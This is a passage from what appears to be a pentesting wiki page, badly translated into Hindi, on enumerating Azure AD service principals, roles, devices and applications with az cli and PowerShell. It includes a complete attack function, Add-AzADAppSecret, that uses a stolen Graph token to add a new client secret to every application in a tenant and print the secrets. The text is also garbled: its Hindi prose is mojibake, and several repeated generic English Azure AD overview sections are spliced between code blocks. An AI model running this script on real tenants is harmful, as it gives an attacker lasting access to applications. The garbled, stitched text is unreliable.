Get-AzureADServicePrincipal -All $true | ?{$_.AppId -match "103947652-1234-5834-103846517389"}
# Get owner of SP
Get-AzureADServicePrincipal -ObjectId <id> | Get-AzureADServicePrincipalOwner |fl *
# Get objects owned by a SP
Get-AzureADServicePrincipal -ObjectId <id> | Get-AzureADServicePrincipalOwnedObject
# Get objects created by a SP
Get-AzureADServicePrincipal -ObjectId <id> | Get-AzureADServicePrincipalCreatedObject
# Get groups where the SP is a member
Get-AzureADServicePrincipal | Get-AzureADServicePrincipalMembership
Get-AzureADServicePrincipal -ObjectId <id> | Get-AzureADServicePrincipalMembership |fl *
```
{% endtab %}

{% tab title="Az PowerShell" %}Az PowerShell
```powershell
# Get SPs
Get-AzADServicePrincipal
# Get info of 1 SP
Get-AzADServicePrincipal -ObjectId <id>
# Search SP by string
Get-AzADServicePrincipal | ?{$_.DisplayName -match "app"}
# Get roles of a SP
Get-AzRoleAssignment -ServicePrincipalName <String>
```
## Azure Active Directory

Azure Active Directory (Azure AD) is a cloud-based identity and access management service provided by Microsoft. It allows organizations to manage user identities and access to resources in the Azure cloud environment.

### Key Features

- **Single Sign-On (SSO):** Azure AD enables users to access multiple applications and services with a single set of credentials.
- **Multi-Factor Authentication (MFA):** Azure AD supports MFA, adding an extra layer of security to user logins.
- **Application Management:** Azure AD allows organizations to manage access to applications and services, including provisioning and deprovisioning user accounts.
- **Role-Based Access Control (RBAC):** Azure AD provides RBAC capabilities, allowing organizations to assign specific roles and permissions to users.
- **Conditional Access:** Azure AD enables organizations to define policies that control access to resources based on specific conditions, such as user location or device compliance.
- **Identity Protection:** Azure AD includes features to detect and respond to identity-based threats, such as suspicious sign-in activities or leaked credentials.
- **Azure AD Connect:** Azure AD Connect is a tool that enables organizations to synchronize on-premises Active Directory with Azure AD, allowing for a unified identity management experience.

### Security Considerations

- **Secure Password Policies:** Implement strong password policies and enforce password complexity requirements.
- **Enable MFA:** Enable MFA for all user accounts to add an extra layer of security.
- **Monitor Sign-In Activities:** Regularly monitor sign-in activities and investigate any suspicious activities.
- **Implement RBAC:** Assign roles and permissions based on the principle of least privilege to limit access to sensitive resources.
- **Enable Conditional Access:** Implement conditional access policies to control access based on specific conditions.
- **Enable Identity Protection:** Enable Azure AD Identity Protection to detect and respond to identity-based threats.
- **Regularly Update and Patch:** Keep Azure AD and associated applications up to date with the latest security patches.
- **Monitor and Audit:** Implement logging and monitoring mechanisms to detect and respond to security incidents.
- **Educate Users:** Provide security awareness training to users to help them understand and mitigate common security risks.

### Useful Resources

- [Azure Active Directory Documentation](https://docs.microsoft.com/en-us/azure/active-directory/)
- [Azure AD Connect Documentation](https://docs.microsoft.com/en-us/azure/active-directory/hybrid/whatis-azure-ad-connect)
- [Azure AD Identity Protection Documentation](https://docs.microsoft.com/en-us/azure/active-directory/identity-protection/overview)
- [Azure AD Security Best Practices](https://docs.microsoft.com/en-us/azure/active-directory/identity-protection/overview)
- [Azure AD Security Center](https://docs.microsoft.com/en-us/azure/active-directory/identity-protection/overview)
```powershell
$Token = 'eyJ0eX..'
$URI = 'https://graph.microsoft.com/v1.0/applications'
$RequestParams = @{
Method  = 'GET'
Uri     = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value
```
<details>

<summary>‡§™‡•ç‡§∞‡§§‡•ç‡§Ø‡•á‡§ï ‡§è‡§Ç‡§ü‡§∞‡§™‡•ç‡§∞‡§æ‡§á‡§ú ‡§ê‡§™ ‡§™‡§∞ ‡§∏‡•Ç‡§ö‡•Ä‡§¨‡§¶‡•ç‡§ß ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞ ‡§è‡§ï ‡§ï‡•ç‡§≤‡§æ‡§á‡§Ç‡§ü ‡§∏‡•Ä‡§ï‡•ç‡§∞‡•á‡§ü ‡§ú‡•ã‡§°‡§º‡§®‡•á ‡§ï‡§æ ‡§™‡•ç‡§∞‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç</summary>
```powershell
# Just call Add-AzADAppSecret
Function Add-AzADAppSecret
{
<#
.SYNOPSIS
Add client secret to the applications.

.PARAMETER GraphToken
Pass the Graph API Token

.EXAMPLE
PS C:\> Add-AzADAppSecret -GraphToken 'eyJ0eX..'

.LINK
https://docs.microsoft.com/en-us/graph/api/application-list?view=graph-rest-1.0&tabs=http
https://docs.microsoft.com/en-us/graph/api/application-addpassword?view=graph-rest-1.0&tabs=http
#>

[CmdletBinding()]
param(
[Parameter(Mandatory=$True)]
[String]
$GraphToken = $null
)

$AppList = $null
$AppPassword = $null

# List All the Applications

$Params = @{
"URI"     = "https://graph.microsoft.com/v1.0/applications"
"Method"  = "GET"
"Headers" = @{
"Content-Type"  = "application/json"
"Authorization" = "Bearer $GraphToken"
}
}

try
{
$AppList = Invoke-RestMethod @Params -UseBasicParsing
}
catch
{
}

# Add Password in the Application

if($AppList -ne $null)
{
[System.Collections.ArrayList]$Details = @()

foreach($App in $AppList.value)
{
$ID = $App.ID
$psobj = New-Object PSObject

$Params = @{
"URI"     = "https://graph.microsoft.com/v1.0/applications/$ID/addPassword"
"Method"  = "POST"
"Headers" = @{
"Content-Type"  = "application/json"
"Authorization" = "Bearer $GraphToken"
}
}

$Body = @{
"passwordCredential"= @{
"displayName" = "Password"
}
}

try
{
$AppPassword = Invoke-RestMethod @Params -UseBasicParsing -Body ($Body | ConvertTo-Json)
Add-Member -InputObject $psobj -NotePropertyName "Object ID" -NotePropertyValue $ID
Add-Member -InputObject $psobj -NotePropertyName "App ID" -NotePropertyValue $App.appId
Add-Member -InputObject $psobj -NotePropertyName "App Name" -NotePropertyValue $App.displayName
Add-Member -InputObject $psobj -NotePropertyName "Key ID" -NotePropertyValue $AppPassword.keyId
Add-Member -InputObject $psobj -NotePropertyName "Secret" -NotePropertyValue $AppPassword.secretText
$Details.Add($psobj) | Out-Null
}
catch
{
Write-Output "Failed to add new client secret to '$($App.displayName)' Application."
}
}
if($Details -ne $null)
{
Write-Output ""
Write-Output "Client secret added to : "
Write-Output $Details | fl *
}
}
else
{
Write-Output "Failed to Enumerate the Applications."
}
}
```
</details>

### ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ‡§è‡§Å

{% tabs %}
{% tab title="az cli" %}
```bash
# Get roles
az role definition list
# Get assigned roles
az role assignment list --all --query "[].roleDefinitionName"
az role assignment list --all | jq '.[] | .roleDefinitionName,.scope'
# Get info of 1 role
az role definition list --name "AzureML Registry User"
# Get only custom roles
az role definition list --custom-role-only
# Get only roles assigned to the resource group indicated
az role definition list --resource-group <resource_group>
# Get only roles assigned to the indicated scope
az role definition list --scope <scope>
# Get all the principals a role is assigned to
az role assignment list --all --query "[].{principalName:principalName,principalType:principalType,resourceGroup:resourceGroup,roleDefinitionName:roleDefinitionName}[?roleDefinitionName=='<ROLE_NAME>']"
```
## Azure AD

Azure Active Directory (Azure AD) is a cloud-based identity and access management service provided by Microsoft. It allows organizations to manage user identities and control access to resources in the Azure cloud environment.

### Key Features

- **User Management**: Azure AD enables organizations to create and manage user accounts, assign roles and permissions, and enforce password policies.

- **Single Sign-On (SSO)**: Azure AD supports SSO, allowing users to sign in once and access multiple applications and resources without the need for separate credentials.

- **Multi-Factor Authentication (MFA)**: Azure AD provides MFA capabilities to add an extra layer of security by requiring users to provide additional verification, such as a code sent to their mobile device, in addition to their password.

- **Application Management**: Azure AD allows organizations to register and manage applications, control access to them, and enforce policies for application usage.

- **Integration with Other Services**: Azure AD integrates with various Microsoft services, such as Azure Information Protection, Azure Rights Management, and Azure Multi-Factor Authentication, to provide comprehensive security and identity management solutions.

### Security Considerations

- **Password Policies**: Organizations should enforce strong password policies, including requirements for password complexity, expiration, and account lockouts, to prevent unauthorized access.

- **MFA**: Enabling MFA for user accounts adds an extra layer of security and helps protect against unauthorized access even if passwords are compromised.

- **Conditional Access**: Organizations can use conditional access policies to control access to resources based on specific conditions, such as user location, device health, or risk level.

- **Privileged Identity Management (PIM)**: Azure AD PIM allows organizations to manage and monitor privileged roles, providing just-in-time access and reducing the risk of unauthorized access.

- **Monitoring and Logging**: Organizations should enable logging and monitoring features in Azure AD to detect and respond to suspicious activities, such as failed sign-in attempts or unusual access patterns.

- **Regular Auditing**: Regularly reviewing and auditing Azure AD configurations, user accounts, and access permissions helps identify and mitigate potential security risks.

### Conclusion

Azure AD is a powerful identity and access management service that provides organizations with the tools and capabilities to secure their Azure cloud environment. By implementing best practices and following security considerations, organizations can enhance the security of their Azure AD deployment and protect their resources from unauthorized access.
```powershell
# Get all available role templates
Get-AzureADDirectoryroleTemplate
# Get enabled roles (Assigned roles)
Get-AzureADDirectoryRole
Get-AzureADDirectoryRole -ObjectId <roleID> #Get info about the role
# Get custom roles - use AzureAdPreview
Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName
# Users assigned a role (Global Administrator)
Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember
Get-AzureADDirectoryRole -ObjectId <id> | fl
# Roles of the Administrative Unit (who has permissions over the administrative unit and its members)
Get-AzureADMSScopedRoleMembership -Id <id> | fl *
```
{% endtab %}

{% tab title="Az PowerShell" %}Az PowerShell
```powershell
# Get role assignments on the subscription
Get-AzRoleDefinition
# Get Role definition
Get-AzRoleDefinition -Name "Virtual Machine Command Executor"
# Get roles of a user or resource
Get-AzRoleAssignment -SignInName test@corp.onmicrosoft.com
Get-AzRoleAssignment -Scope /subscriptions/<subscription-id>/resourceGroups/<res_group_name>/providers/Microsoft.Compute/virtualMachines/<vm_name>
```
## Azure Active Directory

Azure Active Directory (Azure AD) is a cloud-based identity and access management service provided by Microsoft. It allows organizations to manage user identities and access to resources in the Azure cloud environment.

### Key Features

- **Single Sign-On (SSO):** Azure AD enables users to access multiple applications and services with a single set of credentials.
- **Multi-Factor Authentication (MFA):** Azure AD supports MFA, adding an extra layer of security to user logins.
- **Application Management:** Azure AD allows organizations to manage access to applications and services, including provisioning and deprovisioning user accounts.
- **Role-Based Access Control (RBAC):** Azure AD provides RBAC capabilities, allowing organizations to assign specific roles and permissions to users.
- **Conditional Access:** Azure AD enables organizations to define policies that control access to resources based on specific conditions, such as user location or device compliance.
- **Identity Protection:** Azure AD includes features to detect and respond to identity-based threats, such as suspicious sign-in activities or leaked credentials.
- **Azure AD Connect:** Azure AD Connect is a tool that enables organizations to synchronize on-premises Active Directory with Azure AD, allowing for a unified identity management experience.

### Security Considerations

- **Secure Password Policies:** Implement strong password policies and enforce password complexity requirements.
- **Enable MFA:** Enable MFA for all user accounts to add an extra layer of security.
- **Monitor Sign-In Activities:** Regularly monitor sign-in activities and investigate any suspicious activities.
- **Implement RBAC:** Assign roles and permissions based on the principle of least privilege to limit access to sensitive resources.
- **Enable Conditional Access:** Implement conditional access policies to control access based on specific conditions.
- **Enable Identity Protection:** Enable Azure AD Identity Protection to detect and respond to identity-based threats.
- **Regularly Update and Patch:** Keep Azure AD and associated applications up to date with the latest security patches.
- **Monitor and Audit:** Implement logging and monitoring mechanisms to detect and respond to security incidents.
- **Educate Users:** Provide security awareness training to users to help them understand and mitigate common security risks.

### Useful Resources

- [Azure Active Directory Documentation](https://docs.microsoft.com/en-us/azure/active-directory/)
- [Azure AD Connect Documentation](https://docs.microsoft.com/en-us/azure/active-directory/hybrid/)

{% endtab %}
```powershell
# Get permissions over a resource using ARM directly
$Token = (Get-AzAccessToken).Token
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers/Microsoft.Compute/virtualMachines/infradminsrv/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value
```
{% endtab %}
{% endtabs %}

### ‡§â‡§™‡§ï‡§∞‡§£

{% tabs %}
{% tab title="az cli" %}
```bash
# If you know how to do this send a PR!
```
## Azure AD

Azure Active Directory (Azure AD) is a cloud-based identity and access management service provided by Microsoft. It allows organizations to manage user identities and control access to resources in the Azure cloud environment.

### Key Features

- **User Management**: Azure AD enables organizations to create and manage user accounts, assign roles and permissions, and enforce password policies.

- **Single Sign-On (SSO)**: Azure AD supports SSO, allowing users to sign in once and access multiple applications and resources without the need to enter credentials repeatedly.

- **Multi-Factor Authentication (MFA)**: Azure AD provides MFA capabilities to add an extra layer of security by requiring users to provide additional verification, such as a code sent to their mobile device, in addition to their password.

- **Application Management**: Azure AD allows organizations to register and manage applications, control access to them, and enforce policies for application usage.

- **Integration with Other Services**: Azure AD integrates with various Microsoft services, such as Azure DevOps, Azure Information Protection, and Azure Rights Management, to provide seamless access and security across the Azure ecosystem.

### Security Considerations

- **Secure Configuration**: It is important to configure Azure AD with secure settings, such as enabling MFA for all users, enforcing strong password policies, and regularly reviewing and updating user access permissions.

- **Monitoring and Logging**: Organizations should enable logging and monitoring for Azure AD activities to detect and respond to any suspicious or unauthorized access attempts.

- **Role-Based Access Control (RBAC)**: Implementing RBAC in Azure AD helps ensure that users have the appropriate level of access to resources based on their roles and responsibilities.

- **Conditional Access Policies**: Organizations can define conditional access policies in Azure AD to enforce additional security measures, such as requiring MFA for specific applications or locations.

- **Regular Auditing**: Regularly auditing Azure AD configurations and user access permissions helps identify and mitigate any potential security vulnerabilities or unauthorized access.

### Conclusion

Azure AD is a powerful identity and access management service that provides organizations with the tools and capabilities to secure their Azure cloud environment. By implementing secure configurations, monitoring activities, and enforcing strong access controls, organizations can enhance the security of their Azure AD deployment.
```powershell
# Enumerate Devices
Get-AzureADDevice -All $true | fl *
# List all the active devices (and not the stale devices)
Get-AzureADDevice -All $true | ?{$_.ApproximateLastLogonTimeStamp -ne $null}
# Get owners of all devices
Get-AzureADDevice -All $true | Get-AzureADDeviceRegisteredOwner
Get-AzureADDevice -All $true | %{if($user=Get-AzureADDeviceRegisteredOwner -ObjectId $_.ObjectID){$_;$user.UserPrincipalName;"`n"}}
# Registred users of all the devices
Get-AzureADDevice -All $true | Get-AzureADDeviceRegisteredUser
Get-AzureADDevice -All $true | %{if($user=Get-AzureADDeviceRegisteredUser -ObjectId $_.ObjectID){$_;$user.UserPrincipalName;"`n"}}
# Get dives managed using Intune
Get-AzureADDevice -All $true | ?{$_.IsCompliant -eq "True"}
# Get devices owned by a user
Get-AzureADUserOwnedDevice -ObjectId test@corp.onmicrosoft.com
# Get Administrative Units of a device
Get-AzureADMSAdministrativeUnit | where { Get-AzureADMSAdministrativeUnitMember -ObjectId $_.ObjectId | where {$_.ObjectId -eq $deviceObjId} }
```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
‡§Ø‡§¶‡§ø ‡§è‡§ï ‡§â‡§™‡§ï‡§∞‡§£ (‡§µ‡•Ä‡§è‡§Æ) **AzureAD ‡§∏‡•á ‡§ú‡•Å‡§°‡§º‡§æ ‡§π‡•Å‡§Ü** ‡§π‡•à, ‡§§‡•ã AzureAD ‡§ï‡•á ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ **‡§≤‡•â‡§ó‡§ø‡§® ‡§ï‡§∞ ‡§∏‡§ï‡•á‡§Ç‡§ó‡•á**‡•§
‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, ‡§Ø‡§¶‡§ø ‡§≤‡•â‡§ó ‡§á‡§® ‡§ï‡§ø‡§è ‡§ó‡§è ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§â‡§™‡§ï‡§∞‡§£ ‡§ï‡•á **‡§Æ‡§æ‡§≤‡§ø‡§ï** ‡§π‡•à‡§Ç, ‡§§‡•ã ‡§µ‡§π **‡§∏‡•ç‡§•‡§æ‡§®‡•Ä‡§Ø ‡§µ‡•ç‡§Ø‡§µ‡§∏‡•ç‡§•‡§æ‡§™‡§ï** ‡§π‡•ã‡§Ç‡§ó‡•á‡•§
{% endhint %}

### ‡§ê‡§™‡•ç‡§∏

{% hint style="info" %}
**‡§ê‡§™‡•ç‡§∏** ‡§™‡•ã‡§∞‡•ç‡§ü‡§≤ ‡§Æ‡•á‡§Ç **‡§ê‡§™ ‡§™‡§Ç‡§ú‡•Ä‡§ï‡§∞‡§£** ‡§π‡•à‡§Ç (‡§µ‡•ç‡§Ø‡§æ‡§µ‡§∏‡§æ‡§Ø‡§ø‡§ï ‡§ê‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§® ‡§®‡§π‡•Ä‡§Ç)‡•§
‡§≤‡•á‡§ï‡§ø‡§® ‡§™‡•ç‡§∞‡§§‡•ç‡§Ø‡•á‡§ï ‡§ê‡§™ ‡§™‡§Ç‡§ú‡•Ä‡§ï‡§∞‡§£ ‡§è‡§ï **‡§µ‡•ç‡§Ø‡§æ‡§µ‡§∏‡§æ‡§Ø‡§ø‡§ï ‡§ê‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§®** (**‡§∏‡•á‡§µ‡§æ ‡§™‡•ç‡§∞‡§ø‡§Ç‡§∏‡§ø‡§™‡§≤**) ‡§¨‡§®‡§æ‡§è‡§ó‡§æ ‡§ú‡§ø‡§∏‡§ï‡§æ ‡§®‡§æ‡§Æ ‡§∏‡§Æ‡§æ‡§® ‡§π‡•ã‡§ó‡§æ‡•§
‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, ‡§Ø‡§¶‡§ø ‡§ê‡§™ ‡§è‡§ï **‡§Æ‡§≤‡•ç‡§ü‡•Ä-‡§ü‡•á‡§®‡•á‡§Ç‡§ü ‡§ê‡§™** ‡§π‡•à, ‡§§‡•ã **‡§â‡§∏ ‡§ü‡•á‡§®‡•á‡§Ç‡§ü** ‡§Æ‡•á‡§Ç ‡§è‡§ï ‡§î‡§∞ ‡§µ‡•ç‡§Ø‡§æ‡§µ‡§∏‡§æ‡§Ø‡§ø‡§ï ‡§ê‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§® (**‡§∏‡•á‡§µ‡§æ ‡§™‡•ç‡§∞‡§ø‡§Ç‡§∏‡§ø‡§™‡§≤**) ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§π‡•ã‡§ó‡§æ ‡§ú‡§ø‡§∏‡§ï‡§æ ‡§®‡§æ‡§Æ ‡§∏‡§Æ‡§æ‡§® ‡§π‡•ã‡§ó‡§æ‡•§
{% endhint %}

‡§ú‡§¨ ‡§è‡§ï ‡§ê‡§™ ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§π‡•ã‡§§‡§æ ‡§π‡•à, ‡§§‡•ã ‡§¶‡•ã ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞ ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø‡§Ø‡§æ‡§Å ‡§¶‡•Ä ‡§ú‡§æ‡§§‡•Ä ‡§π‡•à‡§Ç:

* **‡§∏‡•á‡§µ‡§æ ‡§™‡•ç‡§∞‡§ø‡§Ç‡§∏‡§ø‡§™‡§≤** ‡§ï‡•ã ‡§¶‡•Ä ‡§ó‡§à **‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø‡§Ø‡§æ‡§Å**
* **‡§ê‡§™** ‡§ï‡•ã ‡§¶‡•Ä ‡§ú‡§æ ‡§∏‡§ï‡§®‡•á ‡§µ‡§æ‡§≤‡•Ä **‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø‡§Ø‡§æ‡§Å** ‡§ú‡§ø‡§®‡•ç‡§π‡•á‡§Ç **‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•á ‡§®‡§æ‡§Æ ‡§Æ‡•á‡§Ç** ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§
```bash
# List Apps
az ad app list
az ad app list --query "[].[displayName]" -o table
# Get info of 1 App
az ad app show --id 00000000-0000-0000-0000-000000000000
# Search App by string
az ad app list --query "[?contains(displayName,'app')].displayName"
# Get the owner of an application
az ad app owner list --id <id> --query "[].[displayName]" -o table
# List all the apps with an application password
az ad app list --query "[?passwordCredentials != null].displayName"
# List apps that have key credentials (use of certificate authentication)
az ad app list --query "[?keyCredentials != null].displayName"
```
## Azure AD

Azure Active Directory (Azure AD) is a cloud-based identity and access management service provided by Microsoft. It allows organizations to manage user identities and control access to resources in the Azure cloud environment.

### Key Features

- **User Management**: Azure AD enables organizations to create and manage user accounts, assign roles and permissions, and enforce password policies.

- **Single Sign-On (SSO)**: Azure AD supports SSO, allowing users to sign in once and access multiple applications and resources without the need to enter credentials repeatedly.

- **Multi-Factor Authentication (MFA)**: Azure AD provides MFA capabilities to add an extra layer of security by requiring users to provide additional verification, such as a code sent to their mobile device, in addition to their password.

- **Application Management**: Azure AD allows organizations to register and manage applications, control access to them, and enforce policies for application usage.

- **Integration with Other Services**: Azure AD integrates with various Microsoft services, such as Azure DevOps, Azure Information Protection, and Azure Rights Management, to provide seamless access and security across the Azure ecosystem.

### Security Considerations

When pentesting Azure AD, it is important to focus on the following areas:

- **User Enumeration**: Enumerating valid user accounts can help an attacker identify potential targets for further exploitation.

- **Password Attacks**: Brute-forcing, password spraying, and credential stuffing attacks can be used to gain unauthorized access to user accounts.

- **Privilege Escalation**: Exploiting misconfigurations or vulnerabilities in Azure AD can lead to privilege escalation, allowing an attacker to gain higher levels of access and control.

- **Token-based Attacks**: Azure AD uses tokens for authentication and authorization. Understanding how these tokens are generated, validated, and used can help identify potential vulnerabilities.

- **Application Security**: Assessing the security of applications integrated with Azure AD is crucial, as vulnerabilities in these applications can be leveraged to compromise user accounts or gain unauthorized access to resources.

### Tools and Techniques

Various tools and techniques can be used for pentesting Azure AD, including:

- **Azure AD PowerShell Module**: This module provides cmdlets for managing Azure AD resources and can be used for tasks such as user enumeration, password attacks, and privilege escalation.

- **OAuth/OIDC Testing**: Testing the security of OAuth and OpenID Connect (OIDC) implementations in Azure AD can help identify vulnerabilities related to token-based authentication.

- **Application Security Testing**: Conducting security assessments of applications integrated with Azure AD, including web applications and mobile apps, can help identify vulnerabilities that could be exploited to compromise user accounts or gain unauthorized access.

- **Azure AD Connect**: Understanding the configuration and security of Azure AD Connect, which is used to synchronize on-premises Active Directory with Azure AD, is important for assessing the overall security of Azure AD.

### Conclusion

Azure AD is a critical component of the Azure cloud environment, providing identity and access management capabilities. Understanding its features, security considerations, and the tools and techniques for pentesting it is essential for ensuring the security of Azure-based systems and applications.
```powershell
# List all registered applications
Get-AzureADApplication -All $true
# Get details of an application
Get-AzureADApplication -ObjectId <id>  | fl *
# List all the apps with an application password
Get-AzureADApplication -All $true | %{if(Get-AzureADApplicationPasswordCredential -ObjectID $_.ObjectID){$_}}
# Get owner of an application
Get-AzureADApplication -ObjectId <id> | Get-AzureADApplicationOwner |fl *
```
{% endtab %}

{% tab title="Az PowerShell" %}Az PowerShell
```powershell
# Get Apps
Get-AzADApplication
# Get details of one App
Get-AzADApplication -ObjectId <id>
# Get App searching by string
Get-AzADApplication | ?{$_.DisplayName -match "app"}
# Get Apps with password
Get-AzADAppCredential
```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
‡§è‡§ï ‡§ê‡§™ ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç **`AppRoleAssignment.ReadWrite`** ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§π‡•ã‡§§‡•Ä ‡§π‡•à, ‡§µ‡§π ‡§ñ‡•Å‡§¶ ‡§ï‡•ã ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ ‡§™‡•ç‡§∞‡§¶‡§æ‡§® ‡§ï‡§∞‡§ï‡•á **‡§ó‡•ç‡§≤‡•ã‡§¨‡§≤ ‡§µ‡•ç‡§Ø‡§µ‡§∏‡•ç‡§•‡§æ‡§™‡§ï** ‡§§‡§ï ‡§â‡§®‡•ç‡§®‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§\
‡§Ö‡§ß‡§ø‡§ï ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§ï‡•á ‡§≤‡§ø‡§è [**‡§Ø‡§π ‡§¶‡•á‡§ñ‡•á‡§Ç**](https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse-74aee1006f48)‡•§
{% endhint %}

{% hint style="info" %}
‡§è‡§ï ‡§ó‡•Å‡§™‡•ç‡§§ ‡§∏‡•ç‡§ü‡•ç‡§∞‡§ø‡§Ç‡§ó ‡§ú‡•ã ‡§è‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§® ‡§ü‡•ã‡§ï‡§® ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§ï‡§∞‡§§‡•á ‡§∏‡§Æ‡§Ø ‡§Ö‡§™‡§®‡•Ä ‡§™‡§π‡§ö‡§æ‡§® ‡§∏‡§æ‡§¨‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, ‡§è‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§® ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§π‡•ã‡§§‡§æ ‡§π‡•à‡•§\
‡§á‡§∏‡§≤‡§ø‡§è, ‡§Ø‡§¶‡§ø ‡§Ü‡§™ ‡§á‡§∏ **‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§°** ‡§ï‡•ã ‡§™‡§æ‡§§‡•á ‡§π‡•à‡§Ç, ‡§§‡•ã ‡§Ü‡§™ **‡§∏‡•á‡§µ‡§æ ‡§™‡•ç‡§∞‡§ø‡§Ç‡§∏‡§ø‡§™‡§≤** ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç **‡§ü‡•á‡§®‡•á‡§Ç‡§ü** ‡§ï‡•á **‡§Ö‡§Ç‡§¶‡§∞** ‡§è‡§ï‡•ç‡§∏‡•á‡§∏ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§\
‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø ‡§Ø‡§π ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§ï‡•á‡§µ‡§≤ ‡§ú‡§¨ ‡§ú‡•á‡§®‡§∞‡•á‡§ü ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§§‡§¨ ‡§¶‡§ø‡§ñ‡§æ‡§à ‡§¶‡•á‡§§‡§æ ‡§π‡•à (‡§Ü‡§™ ‡§á‡§∏‡•á ‡§¨‡§¶‡§≤ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§≤‡•á‡§ï‡§ø‡§® ‡§Ü‡§™ ‡§á‡§∏‡•á ‡§´‡§ø‡§∞ ‡§∏‡•á ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á)‡•§\
‡§è‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§® ‡§ï‡•á **‡§Æ‡§æ‡§≤‡§ø‡§ï** ‡§ï‡•ã ‡§á‡§∏‡§Æ‡•á‡§Ç **‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§ú‡•ã‡§°‡§º‡§®‡•á** ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§π‡•ã‡§§‡•Ä ‡§π‡•à (‡§§‡§æ‡§ï‡§ø ‡§µ‡§π ‡§á‡§∏‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§ï‡§∞‡§£ ‡§ï‡§∞ ‡§∏‡§ï‡•á)‡•§\
‡§á‡§® ‡§∏‡•á‡§µ‡§æ ‡§™‡•ç‡§∞‡§ø‡§Ç‡§∏‡§ø‡§™‡§≤ ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§≤‡•â‡§ó‡§ø‡§® ‡§ï‡•ã **‡§ú‡•ã‡§ñ‡§ø‡§Æ‡•Ä ‡§®‡§π‡•Ä‡§Ç** ‡§Æ‡§æ‡§®‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§â‡§®‡§Æ‡•á‡§Ç **MFA ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã‡§ó‡§æ**‡•§
{% endhint %}

### ‡§™‡•ç‡§∞‡§∂‡§æ‡§∏‡§®‡§ø‡§ï ‡§á‡§ï‡§æ‡§á‡§Ø‡§æ‡§Å

‡§Ø‡§π ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§ï‡•á ‡§¨‡•á‡§π‡§§‡§∞ ‡§™‡•ç‡§∞‡§¨‡§Ç‡§ß‡§® ‡§ï‡•á ‡§≤‡§ø‡§è ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§

